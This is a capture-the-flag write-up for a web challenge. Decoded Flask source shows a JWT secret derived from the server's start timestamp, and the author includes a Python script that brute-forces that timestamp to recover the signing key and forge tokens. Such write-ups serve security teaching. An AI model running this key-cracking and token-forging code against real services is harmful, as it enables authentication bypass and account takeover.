## Description
This Web challenge ought to challenge your mettle. It seems like a standard web application just like any other. However, what you can uncover lies in your hands. How far will you go to become the ultimate Web Conquerer. What magical secrets are you capable of uncovering? Obtain the flag and unveil to me your true and ultimate potential!!
## Hints 
none
## Solution
Getting in the challenge, we got a login form

![image](https://github.com/user-attachments/assets/8eb94c64-99d2-4044-8589-b1d4671351c1)

And some base64 encoded content

![image](https://github.com/user-attachments/assets/c3e23678-6f23-4846-8c28-e34382c7f3e3)
Decode the string I got the source code of the website
```python
app = Flask(__name__)
start_time = int(time.time())

app.config['SECRET_KEY'] = f"Zi-S3CR3T-KEY-{start_time}"
app.config['SESSION_SECRET_KEY'] = app.config['SECRET_KEY']

GUEST_USERNAME = "guest"
GUEST_PASSWORD = "ezypass123"

def session_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('session')
        if not token:
            return redirect(url_for('login'))
        try:
            data = jwt.decode(token, app.config['SESSION_SECRET_KEY'], algorithms=["HS256"])
            username = data.get('username')
            if username not in ['guest', 'admin']:
                raise jwt.InvalidTokenError
        except jwt.ExpiredSignatureError:
            return redirect(url_for('login'))
        except jwt.InvalidTokenError:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function
```
It seems like the challenge got their timestamp and make it a secret key for the JWT: `Zi-S3CR3T-KEY-{start_time}`.

It also get the token as request and return the user if it not match the requirements, so we have to find the timestamp of the start time and modify the jwt to get the flag.

The website provided us `guest:ezypass123`, so let get into it.

![image](https://github.com/user-attachments/assets/a0a65126-50d5-4c95-b7c4-9b71ca3d0e70)
As expected, we got a JWT that contains data of guest.

We do know that the signature part having partern `Zi-S3CR3T-KEY-{start_time}`, so we could just brute-force it.

```python
import base64
import hmac
import hashlib
import json

target_signature = "guACOMVy3HEYjuCeDMFiKx8l_y3XCtr7_obY7F4t8qs"

# Step 1: Base64URL encode the header
header = {"alg": "HS256", "typ": "JWT"}
header_json = json.dumps(header, separators=(",", ":"))
header_encoded = base64.urlsafe_b64encode(header_json.encode()).decode().rstrip("=")

# Step 2: Base64URL encode the payload for "guest"
payload = {"username": "guest"}
payload_json = json.dumps(payload, separators=(",", ":"))
payload_encoded = base64.urlsafe_b64encode(payload_json.encode()).decode().rstrip("=")

# Step 3: Brute-force the start_time over a small range
for start_time in range(1723061810, 1725261820): 
    key = f"Zi-S3CR3T-KEY-{start_time}"
    message = f"{header_encoded}.{payload_encoded}".encode()
    signature = hmac.new(key.encode(), message, hashlib.sha256).digest()
    signature_encoded = base64.urlsafe_b64encode(signature).decode().rstrip("=")

    # Check if the generated signature matches the target signature
    if signature_encoded == target_signature:
        jwt_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
        print(f"Match found!\nStart time: {start_time}\nJWT: {jwt_token}")
        break
else:
    print("No matching JWT found in the specified range.")
```
Shout out to chatgpt, my lazy ass could never.

![image](https://github.com/user-attachments/assets/0542f94b-eb83-4e71-ab25-766578d32e1e)
Got the timestamp, now we have the right JWT and the flag.

![image](https://github.com/user-attachments/assets/01457a70-06a7-4d1e-afc1-9e9a83feb1ba)




